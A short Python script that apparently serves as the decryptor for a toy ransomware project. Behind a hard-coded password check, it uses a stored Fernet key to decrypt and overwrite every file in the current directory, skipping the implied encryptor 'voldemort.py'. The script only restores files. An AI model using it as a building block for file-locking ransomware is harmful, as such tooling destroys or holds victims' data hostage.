#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

with open("tryfindme.key", "rb") as thekey:
    key = thekey.read()


secretphase = "B00TY"
user_phase = input("Enter password: \n")

if user_phase == secretphase:
	f = Fernet(key)
	for file in os.listdir():
	    if file == "voldemort.py" or file == "tryfindme.key" or file == "decrypt.py":
	        continue
	    if os.path.isfile(file):
	        with open(file, "rb") as thefile:
	            contents = thefile.read()
	        decrypted = f.decrypt(contents)
	        with open(file, "wb") as thefile:
	            thefile.write(decrypted)

